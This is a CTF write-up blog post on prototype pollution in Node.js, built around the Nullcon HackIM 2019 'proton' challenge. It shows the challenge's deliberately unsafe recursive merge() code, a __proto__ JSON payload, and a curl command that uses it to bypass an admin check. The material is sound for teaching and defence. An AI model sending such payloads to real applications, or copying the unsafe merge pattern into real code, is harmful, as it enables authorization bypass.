---
author: AnirudhAnand
layout: post
title: Analysis and Exploitation of Prototype Pollution attacks on NodeJs - Nullcon HackIM CTF web 500 writeup
categories:
- ctf
summary: Prototype Pollution attacks on NodeJs is a recent research by Olivier Arteau where he discovered how to exploit an application if we can pollute the prototype of a base object.
description: Prototype Pollution attacks on NodeJs is a recent research by Olivier Arteau where he discovered how to exploit an application if we can pollute the prototype of a base object.
---

## Introduction

Prototype Pollution attacks, as the name suggests, is about polluting the prototype of a base object which can sometimes lead to RCE. This is a fantastic research done by Olivier Arteau and has given a talk on [NorthSec 2018](https://www.youtube.com/watch?v=LUsiFV3dsK8). Let's look at the vulnerability in a bit more indepth with an example from Nullcon HackIm 2019 challenge named `proton`:


## Objects in javaScript

An object in the javaScript is nothing but a collection of key value pairs where each pair is known as a property. Let's take an example to illustrate (you can use the browser console to execute and try it yourself):


{% highlight javascript lineos %}

var obj = {
    "name": "0daylabs",
    "website": "blog.0daylabs.com"
}

obj.name;     // prints "0daylabs"
obj.website; // prints "blog.0daylabs.com"

console.log(obj);  // prints the entire object along with all of its properties.

{%endhighlight%}

In the above example, `name` and `website` are the properties of the object `obj`. If you carefully look at the last statement, the `console.log` prints out a lot more information than the properties we explicitly defined. Where are these properties coming from ?

`Object` is the fundamental basic object upon which all other objects are created. We can create an empty object (without any properties) by passing the argument `null` while object creation but by default it creates an object of a type that corresponds to its value and inherit all the properties to the newly created object (unless its `null`).

{% highlight javascript lineos %}

console.log(Object.create(null)); // prints an empty object

{%endhighlight%}



## Functions/Classes in javaScript?


In javaScript, the concepts of classes and functions are relative (functions itself serves as the constructor for the class and there is no explicit "classes" itself). Let's take an example:

{% highlight javascript lineos %}

function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
    this.details = function() {
        return this.fullName + " has age: " + this.age;
    }
}

console.log(person.prototype); // prints the prototype property of the function

/*
{constructor: ƒ}
    constructor: ƒ person(fullName, age)
    __proto__: Object
*/

var person1 = new person("Anirudh", 25);
var person2 = new person("Anand", 45);

console.log(person1);

/*
person {age: 25, fullName: "Anirudh"}
age: 45
fullName: "Anand"
__proto__:
    constructor: ƒ person(fullName, age)
        arguments: null
        caller: null
        length: 2
        name: "person"
    prototype: {constructor: ƒ}
    __proto__: ƒ ()
    [[FunctionLocation]]: VM134:1
    [[Scopes]]: Scopes[1]
__proto__: Object
*/

console.log(person2);

/*
person {age: 45, fullName: "Anand"}
age: 45
fullName: "Anand"
__proto__:
    constructor: ƒ person(fullName, age)
        arguments: null
        caller: null
        length: 2
        name: "person"
    prototype: {constructor: ƒ}
    __proto__: ƒ ()
    [[FunctionLocation]]: VM134:1
    [[Scopes]]: Scopes[1]
__proto__: Object
*/

person1.details(); // prints "Anirudh has age: 25"
{%endhighlight%}


In the above example, we defined a function named `person` and we created 2 objects named `person1` and `person2`. If we take a look at the properties of the newly created function and objects, we can note 2 things:

* When a function is created, JavaScript engine includes a `prototype` property to the function. This prototype property is an object (called as prototype object) and has a constructor property by default which points back to the function on which prototype object is a property.

* When an object is created, JavaScript engine adds a `__proto__` property to the newly created object which points to the prototype object of the constructor function. In short, `object.__proto__` is pointing to `function.prototype`.



## WTF is a constructor ?

`Constructor` is a magic property which returns the function that used to create the object. The prototype object has a constructor which points to the function itself and the constructor of the constructor is the global function constructor.


{% highlight javascript lineos %}

var person3 = new person("test", 55);

person3.constructor;  // prints the function "person" itself 

person3.constructor.constructor; // prints ƒ Function() { [native code] }    <- Global Function constructor

person3.constructor.constructor("return 1");

/*
ƒ anonymous(
) {
return 1
}
*/

// Finally call the function
person3.constructor.constructor("return 1")();   // returns 1
{%endhighlight%}


## Prototypes in javaScript

One of the things to note here is that prototype property can be modified at run time to add/delete/edit entries. For example:

{% highlight javascript lineos %}
function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
}

var person1 = new person("Anirudh", 25);

person.prototype.details = function() {
        return this.fullName + " has age: " + this.age;
    }

console.log(person1.details()); // prints "Anirudh has age: 25"
{%endhighlight%}


What we did above is that we modified the function's prototype to add a new property. The same result can be achieved using objects:

{% highlight javascript lineos %}
function person(fullName, age) {
    this.age = age;
    this.fullName = fullName;
}

var person1 = new person("Anirudh", 25);
var person2 = new person("Anand", 45);

// Using person1 object
person1.constructor.prototype.details = function() {
        return this.fullName + " has age: " + this.age;
    }

console.log(person1.details()); // prints "Anirudh has age: 25"

console.log(person2.details()); // prints "Anand has age: 45" :O

{%endhighlight%}


Noticied anything suspicious?  We modified `person1` object but why `person2` also got affected? The reason being that in the first example, we directly modified `person.prototype` to add a new property but in the 2nd example we did exactly the same but using object. We have already seen that constructor returns the function using which the object is created so `person1.constructor` points to the function `person` itself and `person1.constructor.prototype` is same as `person.prototype`.



## Prototype Pollution

Let's take an example, `obj[a][b] = value`. If an attacker can control `a` and `value`, then he can set the value of a to `__proto__` and the property `b` will be defined for all existing object of the application with the value `value`.

Now the attack is not as simple as it feels like from the above statement. According to the [research paper](https://github.com/HoLyVieR/prototype-pollution-nsec18/blob/master/paper/JavaScript_prototype_pollution_attack_in_NodeJS.pdf), this can be exploitable only if any of the following 3 is happening:

1. Object recursive merge
2. Property definition by path
3. Object clone

Let's take the Nullcon HackIM challenge to see a practical scenario. The challenge starts with iterating a MongoDB id (which was trivial to do) and we get access to the below source code: 

{% highlight javascript lineos %}
'use strict';

const express = require('express');
const bodyParser = require('body-parser')
const cookieParser = require('cookie-parser');
const path = require('path');


const isObject = obj => obj && obj.constructor && obj.constructor === Object;

function merge(a, b) {
    for (var attr in b) {
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}

function clone(a) {
    return merge({}, a);
}

// Constants
const PORT = 8080;
const HOST = '0.0.0.0';
const admin = {};

// App
const app = express();
app.use(bodyParser.json())
app.use(cookieParser());

app.use('/', express.static(path.join(__dirname, 'views')));
app.post('/signup', (req, res) => {
    var body = JSON.parse(JSON.stringify(req.body));
    var copybody = clone(body)
    if (copybody.name) {
        res.cookie('name', copybody.name).json({
            "done": "cookie set"
        });
    } else {
        res.json({
            "error": "cookie not set"
        })
    }
});
app.get('/getFlag', (req, res) => {
    var аdmin = JSON.parse(JSON.stringify(req.cookies))
    if (admin.аdmin == 1) {
        res.send("hackim19{}");
    } else {
        res.send("You are not authorized");
    }
});
app.listen(PORT, HOST);
console.log(`Running on http://${HOST}:${PORT}`);
{%endhighlight%}


The code starts with defining a function `merge` which is essentially an insecure design of merging 2 objects. Since the latest version of libraries that does the merge() has already been patched, the challenge delibrately used the old method in which merge used to happen to make it vulnerable.

One thing we can quickly notice in the above code is the definition of 2 "admins" as `const admin` and `var аdmin`. Ideally javaScript doesn't allow to define a `const` variable again as `var` so this has to be different. It took a good amount of time to figure out that one of them has a normal `a` while the other has some other `a` (homograph). So instead of wasting time over it, I renamed it to normal `a` itself and worked on the challenge so that once solved, we can send the payload accordingly.

So from the challenge source code, here are the following observations:

* `Merge()` function is written in a way that prototype pollution can happen (more analysis of the same later in the article). So that's indeed the way to solve the problem.
* The vulnerable function is actually called while hitting `/signup` via `clone(body)` so we can send our JSON payload while signing up which can add the `admin` property and immediately call `/getFlag` to get the flag.
* As discussed above, we can use `__proto__` (points to constructor.prototype) to create the admin property with value *1*.

The simplest payload to do the same: `{"__proto__": {"admin": 1}}`

So the final payload to solve the problem (using curl since I was not able to send homograph via burp):

{% highlight bash lineos %}
curl -vv --header 'Content-type: application/json' -d '{"__proto__": {"admin": 1}}' 'http://0.0.0.0:4000/signup'; curl -vv 'http://0.0.0.0:4000/getFlag'
{%endhighlight%}

## Merge() - Why was it vulnerable?

One obvious question here is what makes the `merge()` function vulnerable here? Here is how it works and what makes it vulnerable:

* The function starts with iterating all properties that is present on the 2nd object `b` (since 2nd is given preference incase of same key-value pairs).
* If the property exists on both first and second arguments and they are both of type `Object`, then it recusively starts to merge it.
* Now if we can control the value of b[attr] to make *attr* as `__proto__` and also if we can control the value inside the proto property in *b*, then while recursion, `a[attr]` at some point will actually point to prototype of the object *a* and we can successfully add a new property to all the objects.

Still confused ? Well I don't blame because it took sometime for myself to understand the concept. let's write some debug statements to figure out whats happening.

{% highlight javascript lineos %}
const isObject = obj => obj && obj.constructor && obj.constructor === Object;

function merge(a, b) {
    console.log(b); // prints { __proto__: { admin: 1 } }
    for (var attr in b) {
        console.log("Current attribute: " + attr); // prints Current attribute: __proto__        
        if (isObject(a[attr]) && isObject(b[attr])) {
            merge(a[attr], b[attr]);
        } else {
            a[attr] = b[attr];
        }
    }
    return a
}

function clone(a) {
    return merge({}, a);
}
{%endhighlight%}

Now let's try sending the curl request mentioned above. What we can notice is, the object *b* now has the value: `{ __proto__: { admin: 1 } }` where `__proto__` is just a property name and is not actually pointing to function prototype. Now during the function merge(), `for (var attr in b)` iterates through every attribute where the first attribute name now is `__proto__`.

Since its always of type object, it starts to recursively call, this time as `merge(a[__proto__], b[__proto__])`. This essentially helped us in getting access to function prototype of `a` and add new properties which is defined in the proto property of `b`.


## References

1. [Olivier Arteau -- Prototype pollution attacks in NodeJS applications](https://www.youtube.com/watch?v=LUsiFV3dsK8)
2. [Prototypes in javaScript](https://hackernoon.com/prototypes-in-javascript-5bba2990e04b)
3. [MDN Web Docs - Object](https://developer.mozilla.org/en-US/docs/Web/JavaScript/Reference/Global_Objects/Object)
